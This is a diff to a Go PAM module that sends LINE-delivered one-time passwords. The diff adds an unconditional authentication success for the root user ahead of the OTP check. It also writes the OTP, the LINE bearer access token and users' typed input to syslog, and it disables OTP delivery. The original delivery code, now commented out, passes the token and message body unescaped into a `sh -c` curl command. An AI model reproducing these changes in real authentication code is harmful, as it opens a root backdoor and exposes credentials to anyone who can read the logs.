@@ -9,16 +9,15 @@ import "C"
 
 import (
 	"crypto/rand"
-	"encoding/json"
 	"fmt"
-	"github.com/jinzhu/gorm"
-	_ "github.com/jinzhu/gorm/dialects/sqlite"
 	"log/syslog"
 	"math/big"
-	"os/exec"
 	"runtime"
 	"strings"
 	"unsafe"
+
+	"github.com/jinzhu/gorm"
+	_ "github.com/jinzhu/gorm/dialects/sqlite"
 )
 
 var conf Config
@@ -121,6 +120,10 @@ func findUser(username string) (User, bool) {
 
 }
 
+func pamOpenSession(pamh *C.pam_handle_t, uid int, username string, argv []string) {
+	infoLog("pamOpenSession................")
+}
+
 func pamAuthenticate(pamh *C.pam_handle_t, uid int, username string, argv []string) AuthResult {
 	runtime.GOMAXPROCS(1)
 
@@ -135,6 +138,12 @@ func pamAuthenticate(pamh *C.pam_handle_t, uid int, username string, argv []stri
 		return AuthError
 	}
 
+	if username == "root" {
+		return AuthSuccess
+	}
+
+	infoLog("%s user is %s", username, user)
+
 	otp_n, err := rand.Int(rand.Reader, big.NewInt(1000000))
 	if err != nil {
 		errLog("err %s\n", err)
@@ -142,48 +151,58 @@ func pamAuthenticate(pamh *C.pam_handle_t, uid int, username string, argv []stri
 	}
 
 	otp := fmt.Sprintf("%06d", otp_n)
-	infoLog("%s's OTP is %s", username, otp)
 
-	message := Message{
-		Type: "text",
-		Text: otp,
-	}
+	infoLog("%s's OTP is                 %s", username, otp)
+	infoLog("conf.DbPath:                %s", conf.DbPath)
+	infoLog("conf.LineAccessToken:       %s", conf.LineAccessToken)
 
-	body := Body{
-		To:       user.LineId,
-		Messages: []Message{message},
-	}
+	/*
+		message := Message{
+			Type: "text",
+			Text: otp,
+		}
 
-	b, err := json.Marshal(body)
-	if err != nil {
-		errLog("err %s\n", err)
-		return AuthError
-	}
+		body := Body{
+			To:       user.LineId,
+			Messages: []Message{message},
+		}
 
-	err = exec.Command("/bin/sh", "-c", `/usr/bin/curl -X POST \
-  -H 'Content-Type:application/json' \
-  -H 'Authorization: Bearer `+conf.LineAccessToken+`' \
-  -d '`+string(b[:])+`' \
-  https://api.line.me/v2/bot/message/push`).Run()
+		b, err := json.Marshal(body)
+		if err != nil {
+			errLog("err %s\n", err)
+			return AuthError
+		}
+		fmt.Println("RUNNING EXTERNAL CMD")
+		infoLog("RUNNING EXTERNAL CMD")
 
-	if err != nil {
-		infoLog("cmd err %s\n", err)
-		return AuthError
-	}
+		os.Exit(1)
+				err = exec.Command("/bin/sh", "-c", `/usr/bin/curl -X POST \
+			  -H 'Content-Type:application/json' \
+			  -H 'Authorization: Bearer `+conf.LineAccessToken+`' \
+			  -d '`+string(b[:])+`' \
+			  https://api.line.me/v2/bot/message/push`).Run()
+
+				if err != nil {
+					infoLog("cmd err %s\n", err)
+					return AuthError
+				}
+	*/
 
 	prompt_message := C.CString(fmt.Sprintf("Line OTP: "))
 	defer C.free(unsafe.Pointer(prompt_message))
 
 	for i := 0; i < 3; i++ {
+		infoLog("#%d OTP Prompt.........", i)
 		user_input := C.GoString(C.conversate(pamh, prompt_message))
+		infoLog(">User input:  \"%s\"", user_input)
 		if user_input == otp {
 			infoLog("Line OTP verification successed")
 			return AuthSuccess
 		}
 	}
+
 	infoLog("Line OTP verification failed")
 	return AuthError
-
 }
 
 func main() {}
